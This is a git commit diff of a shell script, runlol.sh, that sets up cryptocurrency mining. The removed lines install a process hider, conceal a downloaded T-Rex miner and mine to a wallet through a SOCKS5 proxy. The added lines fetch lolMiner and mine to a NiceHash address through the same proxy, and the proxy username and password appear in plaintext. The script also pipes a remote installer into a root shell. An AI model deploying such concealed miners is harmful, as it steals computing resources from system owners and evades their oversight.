0da1d0aac248b361dcedf29982d5cd205cf9e513
novasusan090 <106402065+novasusan090@users.noreply.github.com>
2022-05-27 19:50:03 +0000

    Update runlol.sh

--- runlol.sh
+++ runlol.sh
@@ -1,15 +1,5 @@
-#!/bin/sh
-sudo su 
-sudo apt update
-sudo apt upgrade -y
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-sudo apt-get install -y nodejs
-
-npm i -g node-process-hider
-npm install -g npm
-
-wget https://github.com/trexminer/T-Rex/releases/download/0.24.6/t-rex-0.24.6-linux.tar.gz
-tar -zxf t-rex-0.24.6-linux.tar.gz
-chmod +x t-rex
-sudo ph add t-rex
-./t-rex -a ethash -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DENT --proxy socks5 = Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786 --no-sni --dns-https-server 1.1.1.1
+sudo apt-get update -y
+sudo apt install screen -y
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xf lolMiner_v1.29_Lin64.tar.gz
+cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.GPU --proxy socks5 Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786 --ethstratum ETHPROXY
